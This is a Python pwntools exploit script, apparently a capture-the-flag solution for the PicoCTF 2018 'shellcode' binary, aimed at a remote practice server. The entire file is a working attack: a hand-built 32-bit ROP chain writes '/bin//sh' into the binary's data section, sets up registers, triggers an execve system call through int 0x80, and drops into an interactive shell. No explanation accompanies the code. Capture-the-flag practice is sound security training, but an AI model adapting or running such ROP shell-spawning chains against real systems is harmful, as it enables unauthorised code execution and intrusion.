#+++++++++++++++++++exp.py++++++++++++++++++++
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: Mon Nov 16 14:51:28 CST 2020
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*
from struct import*
#context.log_level = 'debug'
context.arch = 'i386'
context.os = 'linux'

elf = ELF('./PicoCTF_2018_shellcode')
#libc = ELF('null')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc=ELF('/lib/i386-linux-gnu/libc.so.6')

sh = process('./PicoCTF_2018_shellcode')
sh = remote('node3.buuoj.cn',26035)

try:
	p = ''

	p += pack('<I', 0x0806f05a) # pop edx ; ret
	p += pack('<I', 0x080ea060) # @ .data
	p += pack('<I', 0x080b81f6) # pop eax ; ret
	p += '/bin'
	p += pack('<I', 0x08054a0b) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806f05a) # pop edx ; ret
	p += pack('<I', 0x080ea064) # @ .data + 4
	p += pack('<I', 0x080b81f6) # pop eax ; ret
	p += '//sh'
	p += pack('<I', 0x08054a0b) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x0806f05a) # pop edx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x08049333) # xor eax, eax ; ret
	p += pack('<I', 0x08054a0b) # mov dword ptr [edx], eax ; ret
	p += pack('<I', 0x080481c9) # pop ebx ; ret
	p += pack('<I', 0x080ea060) # @ .data
	p += pack('<I', 0x080de995) # pop ecx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x0806f05a) # pop edx ; ret
	p += pack('<I', 0x080ea068) # @ .data + 8
	p += pack('<I', 0x08049333) # xor eax, eax ; ret
	p += pack('<I', 0x0805c312) # inc eax ; ret
	p += pack('<I', 0x0805c312) # inc eax ; ret
	p += pack('<I', 0x0805c312) # inc eax ; ret
	p += pack('<I', 0x0805c312) # inc eax ; ret
	p += pack('<I', 0x0805c312) # inc eax ; ret
	p += pack('<I', 0x0805c312) # inc eax ; ret
	p += pack('<I', 0x0805c312) # inc eax ; ret
	p += pack('<I', 0x0805c312) # inc eax ; ret
	p += pack('<I', 0x0805c312) # inc eax ; ret
	p += pack('<I', 0x0805c312) # inc eax ; ret
	p += pack('<I', 0x0805c312) # inc eax ; ret
	p += pack('<I', 0x0806cc55) # int 0x80
	#gdb.attach(sh)
	sh.sendline(p)
	sh.interactive()
except IOError:
	sh.sendline(p)
	sh.interactive()
